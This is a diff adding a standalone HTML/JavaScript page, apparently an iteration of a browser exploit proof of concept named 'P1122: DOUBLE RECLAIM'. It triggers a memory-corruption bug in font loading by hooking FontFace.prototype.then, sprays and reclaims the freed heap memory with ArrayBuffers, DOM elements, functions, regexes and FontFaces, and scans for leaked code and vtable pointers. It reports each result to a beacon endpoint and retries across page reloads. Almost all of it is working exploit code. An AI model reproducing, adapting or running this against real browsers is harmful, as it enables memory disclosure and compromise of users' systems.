@@ -1,0 +1,192 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1122</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}
+#log{white-space:pre-wrap;word-break:break-all}
+.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}
+.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}
+.win{color:#0f0;font-weight:bold;font-size:14px}
+</style>
+</head><body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+function ptrTag(v){
+  if(typeof v!=='bigint'||v===0n)return'';
+  var hi=Number(v>>32n);
+  if(hi>=0x200&&hi<=0x7FFF)return'CODE';
+  if(hi>=0x10&&hi<=0xFF)return'HEAP';
+  if(hi>=0xFFFF8000)return'KERN';
+  if(v<0x10000n)return'sm';
+  return'v';
+}
+
+var sess;
+try{sess=JSON.parse(localStorage.getItem('p1122')||'null');}catch(e){sess=null;}
+if(!sess)sess={boot:0,hits:0,misses:0,results:[]};
+sess.boot++;
+try{localStorage.setItem('p1122',JSON.stringify(sess));}catch(e){}
+
+B('P1122-BOOT','b='+sess.boot+'|h='+sess.hits+'|m='+sess.misses);
+log('phase','=== P1122: DOUBLE RECLAIM (boot '+sess.boot+', '+sess.hits+' hits) ===');
+
+if(sess.boot>50){
+  log('ok','DONE. '+sess.hits+' hits');
+  B('P1122-DONE','h='+sess.hits+'|m='+sess.misses+'|r='+sess.results.length);
+  for(var i=0;i<sess.results.length;i++)B('P1122-R'+i,sess.results[i]);
+}else{
+
+var SIZES=[64,96,128,160,192,224,256,320,384,512,768,1024,2048];
+var K=8;var r=sess.boot;
+var fired=false,map=null,found=false;
+
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var ff=new FontFace('f'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(fired)return undefined;fired=true;
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  map=[];
+  for(var si=0;si<SIZES.length;si++){
+    var sz=SIZES[si];
+    for(var k=0;k<K;k++)map.push({size:sz,ab:new ArrayBuffer(sz),idx:si*K+k});
+  }
+  try{document.fonts.check('1em r'+r);}catch(e){}
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em f'+r+', r'+r,'AB').then(function(){},function(){});
+
+// Phase 1: Detect hit via polling (proven pattern)
+for(var t=5;t<=250;t+=2){(function(ms){setTimeout(function(){
+  if(found||!map)return;
+  for(var bi=20;bi<56;bi++){
+    if(!map[bi])continue;
+    var b=new BigUint64Array(map[bi].ab);
+    var nz=0;for(var q=0;q<b.length;q++)if(b[q]!==0n)nz++;
+    if(nz>0&&!found){
+      found=true;
+      sess.hits++;
+      B('P1122-HIT','r'+r+'|bi='+bi+'|ms='+ms);
+      log('win','HIT at '+ms+'ms!');
+
+      // Phase 2: Wait for the double-free wipe (50ms based on P1121 oracle)
+      setTimeout(function(){
+        // Verify the block is zeroed
+        var allZero=true;
+        for(var q=0;q<b.length;q++){if(b[q]!==0n){allZero=false;break;}}
+        B('P1122-WIPE','zeroed='+allZero);
+
+        if(!allZero){
+          // Block not wiped yet — log what's there
+          var vals=[];
+          for(var q=0;q<b.length;q++)if(b[q]!==0n)vals.push(q+':'+hex64(b[q]));
+          B('P1122-STILL',vals.join(','));
+          sess.results.push('nowipe|'+vals.join(','));
+          try{localStorage.setItem('p1122',JSON.stringify(sess));}catch(e){}
+          return;
+        }
+
+        // Phase 3: SECOND RECLAIM — allocate objects with vtable/code ptrs!
+        // The block at addr X is now free. Allocate various object types
+        // that are ~192 bytes and might land at X.
+
+        // Strategy A: DOM elements (have C++ vtable pointers)
+        var elems=[];
+        for(var i=0;i<50;i++){
+          var e=document.createElement('span');
+          e.className='reclaim'+i;
+          e.textContent='X'+i;
+          document.body.appendChild(e);
+          elems.push(e);
+        }
+
+        // Strategy B: Functions (JSFunction has StructureID + code ptr)
+        var funcs=[];
+        for(var i=0;i<50;i++){
+          funcs.push(new Function('x','return x+'+i));
+        }
+
+        // Strategy C: Regex objects
+        var regs=[];
+        for(var i=0;i<30;i++){
+          regs.push(new RegExp('test'+i+'pattern'+i));
+        }
+
+        // Strategy D: Error objects (have stack string ptrs)
+        var errs=[];
+        for(var i=0;i<30;i++){
+          try{throw new Error('reclaim'+i);}catch(e){errs.push(e);}
+        }
+
+        // Strategy E: ArrayBuffers of DIFFERENT sizes (to fill other free lists)
+        for(var i=0;i<20;i++)new ArrayBuffer(180);
+        for(var i=0;i<20;i++)new ArrayBuffer(200);
+
+        // Strategy F: More FontFace objects (same size class as CSSFontFace!)
+        var ffs=[];
+        for(var i=0;i<20;i++){
+          var nf=new FontFace('reclaim'+i,'local(Arial)',{unicodeRange:'U+00'+(41+i).toString(16).toUpperCase()});
+          ffs.push(nf);
+        }
+
+        // Now read through our BigUint64Array — did anything land?
+        setTimeout(function(){
+          var vals=[];
+          for(var q=0;q<b.length;q++){
+            if(b[q]!==0n){
+              vals.push(q+':'+hex64(b[q])+'('+ptrTag(b[q])+')');
+            }
+          }
+          if(vals.length===0){
+            B('P1122-EMPTY','no_reclaim');
+            sess.results.push('empty');
+          }else{
+            var res='r'+r+'|'+vals.join(',');
+            B('P1122-RECLAIM',res);
+            sess.results.push(res);
+            log('win','RECLAIM: '+vals.join(' '));
+            // Check for CODE pointers!
+            for(var q=0;q<b.length;q++){
+              if(b[q]!==0n){
+                var hi=Number(b[q]>>32n);
+                if(hi>=0x200&&hi<=0x7FFF){
+                  B('P1122-CODE','q='+q+'|'+hex64(b[q]));
+                  log('win','*** CODE POINTER at +'+q*8+': '+hex64(b[q])+' ***');
+                }
+              }
+            }
+          }
+          try{localStorage.setItem('p1122',JSON.stringify(sess));}catch(e){}
+
+          // Cleanup
+          for(var i=0;i<elems.length;i++){
+            try{document.body.removeChild(elems[i]);}catch(e){}
+          }
+        },10);
+
+      },60); // wait for wipe
+
+    }
+  }
+},ms);})(t);}
+
+// Miss at 350ms
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  if(!found){
+    sess.misses++;
+    B('P1122-M','r'+r);
+    try{localStorage.setItem('p1122',JSON.stringify(sess));}catch(e){}
+  }
+},350);
+
+} // end if boot<=50
+</script>
+</body></html>
